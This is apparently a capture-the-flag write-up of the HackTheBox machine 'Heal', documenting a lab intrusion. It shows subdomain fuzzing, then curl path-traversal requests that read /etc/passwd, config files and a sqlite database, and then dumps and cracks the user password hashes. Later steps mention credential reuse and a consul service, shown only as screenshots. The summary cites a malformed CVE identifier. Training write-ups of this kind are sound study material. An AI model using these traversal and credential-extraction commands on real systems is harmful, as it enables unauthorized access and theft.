---
title: Heal
categories:
  - HackTheBox
tags: [linux, passwordcracking, lfi, cve]
media_subpath: /images/hackthebox_heal/
image:
  path: https://labs.hackthebox.com/storage/avatars/dcd5ef09ab764228c64385374ac744c1.png
---

# Summay
Heal is a medium difficulty machine which was only running a web server and a SSH service. The web server was running a `ruby on rails` application which was vulnerable to an [`LFI (Local File Inclusion)`](/theory/misc/file-inclusion#local-file-inclusion-lfi) and allowed us to read the database file. The database file contained a password hash which we were able to crack and use to login into the application as an administrator. The administrator account had access to a `limesurvey` application which was running on another subdomain. We were able to use the same credentials to login into this application and get access to the `limesurvey` application, which was vulnerable to [`CVE-2021-12-09`](https://www.exploit-db.com/exploits/50573), abusing the exploit we got a foothold on the machine as `www-data`. Reading the configuration files for the `limesurvey` application, we found the credentials for the database and the SSH user `ron` had reused those credentials. Using the credentials for the SSH user, we were able to login into the machine as `ron` and escalate our privileges to `root` by abusing the `consul` service which was running locally on port `8500` of the machine.

## Nmap  

```bash
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFWKy4neTpMZp5wFROezpCVZeStDXH5gI5zP4XB9UarPr/qBNNViyJsTTIzQkCwYb2GwaKqDZ3s60sEZw362L0o=
|   256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMCYbmj9e7GtvnDNH/PoXrtZbCxr49qUY8gUwHmvDKU
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80 - Web
### Vhost Fuzz
Fuzzing the application for subdomains we encountered the `api` subdomain

```bash
ffuf -u http://heal.htb -H 'Host: FUZZ.heal.htb' -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -ic -c 
```
> Command breakdown:
> - `-u`: URL to fuzz
> - `-H`: Header to send with the request
> - `-w`: Wordlist to use for fuzzing
> - `-ic`: Ignore comments on wordlist
> - `-c`: Colorize the output
> - `-fs`: Filter the results by file size
{: .prompt-info}


![NON](file-20250514225133360.png)

We see that we are getting constant results with file size `178`, so we can filter the results from `ffuf` with the parameter `-fs`

```bash
ffuf -u http://heal.htb -H 'Host: FUZZ.heal.htb' -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -ic -c -fs 178 
```

![NON](file-20250514225032259.png)

We add this subdomain to our `/etc/hosts` file

```bash
cat /etc/hosts
10.10.11.46 api.heal.htb heal.htb
```

The web server is very sensitive for handling multiple requests, so our directory fuzzing must be done with fewer threads then normal. Using the `dirsearch` tool on the `api.heal.htb` host, we can find a reference to a `/profile` and `/download` endpoint. Upon interacting with both endpoints, I started receiving an invalid token error:

```bash
curl 'http://api.heal.htb/download.php'
{"errors":"Invalid token"}%
```

Analyzing the requests our browser makes after we login on the `heal.htb` application, we can see it is sending an `authorization` header in the request

![NON](file-20250514233552283.png)

By sending this header on our `download` request, we started getting a different error

```bash
curl 'http://api.heal.htb/download' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ'

{"errors":"Error downloading file: no implicit conversion of nil into String"}
```

It is probably downloading a file, so we started to fuzz for parameter names and try for an `LFI` vulnerability. Since the webserver was very sensitive about fuzzing the application, I tried to manually enumerate the parameter of the `download` endpoint with words like `file`, `name`, `archive`, `filename`, and I've found that `filename` was the correct parameter.

> If the server wasn't so sensitive about multiple requests, we could have enumerated this endpoint parameter using the command `ffuf -u 'http://api.heal.htb/download?FUZZ=../../../../../../../etc/passwd' -H 'Authorization: Bearer \<TOKEN\> -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ic -c -t 10 -fr "no implicit conversion" -x http://127.0.0.1:8080`
{: .prompt-info} 

```bash
curl 'http://api.heal.htb/download?filename=../../../../../../../../etc/passwd' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ'

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
<SNIP>
```

With that, we can read some files of the server. 

To have a better idea of some important files inside the server, since we know it is running `ruby on rails`, we can deploy a simple web instance of this service and manually enumerate the file structure.

```bash
rails new testapp --api -d postgresql
```

```bash
cd testapp

ls
 .dockerignore   .gitattributes   .gitignore   .rubocop.yml    app   config      db           Gemfile        lib   public    󰂺 README.md   storage   tmp
 .git            .github          .kamal       .ruby-version   bin   config.ru   Dockerfile   Gemfile.lock   log   Rakefile   script      test      vendor
```

```bash
ls config

 application.rb   cable.yml   credentials.yml.enc   deploy.yml       environments   locales      puma.rb     recurring.yml   storage.yml
 boot.rb          cache.yml   database.yml          environment.rb   initializers   master.key   queue.yml   routes.rb
```

Reading the `database.yml` file, we can get some information about `sqlite` files present on the server

```bash
curl 'http://api.heal.htb/download?filename=../../config/database.yml' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0fQ.J0NnCAdf82F0IukEy8HTIUHK49VpBnwHhtd4hBp-Y_w'

<SNIP>
development:
  <<: *default
  database: storage/development.sqlite3

test:
  <<: *default
  database: storage/test.sqlite3

production:
  <<: *default
  database: storage/development.sqlite3
<SNIP>
```

We can download the `development.sqlite3` file from the server and read it locally with `curl 'http://api.heal.htb/download?filename=../../storage/development.sqlite3' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' --output ~/HTB/Medium/Heal/development.sqlite3`

Enumerating the database, we can find a hash the we were able to crack using `hashcat`

```bash
sqlite3 development.sqlite3 '.tables'

ar_internal_metadata  token_blacklists
schema_migrations     users

sqlite3 development.sqlite3 'PRAGMA table_info("users");'

0|id|INTEGER|1||1
1|email|varchar|0||0
2|password_digest|varchar|0||0
3|created_at|datetime(6)|1||0
4|updated_at|datetime(6)|1||0
5|fullname|varchar|0||0
6|username|varchar|0||0
7|is_admin|boolean|0||0

sqlite3 development.sqlite3 'select username, password_digest from users;' | sed 's/|/:/' | tee -a users

ralph:$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
railoca:$2a$12$0xVKdMIa5mo.G8w669bs6uKkPbbo5ZFw9F7ldGk/.eHVAMI7/e8xu

hashcat -m 3200 users --username --show

ralph:$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369

```

With this password, we couldn't connect to ssh still, so we try connecting to the application instead and we are successfully logged with administrator privileges on the application

![NON](file-20250515002349947.png)

![NON](file-20250515002503423.png)

By looking at the survey tab, we are redirected to another subdomain

![NON](file-20250515012108944.png)

![NON](file-20250515012515676.png)


![NON](file-20250515012459876.png)

Ralph credentials were valid to login on admin dashboard

![NON](file-20250515013310409.png)

![NON](file-20250515014352897.png)

![NON](file-20250515014839844.png)

At `config.php` file at `/var/www/limesurvey/application/config`, we found some more credentials 

![NON](file-20250515015112930.png)

Trying the password for the ron user, we can see that he reused the password for the database

![NON](file-20250515015234113.png)

To get a more stable shell then `nc`, we established an `SSH`  connection.

![NON](file-20250515015341748.png)

With a simple bash script, we can curl every internal service to see which ones are an `http(s)` server

```bash
ss -lntp | awk '{print $4}' | while IFS= read host; do echo "curling host: $host"; curl -s "$host" |head -n1 ;done
```

![NON](file-20250515020026416.png)

Accessing the forwarded port, we have now access to a `consul` dashboard

![NON](file-20250515020149717.png)

![NON](file-20250515023935052.png)
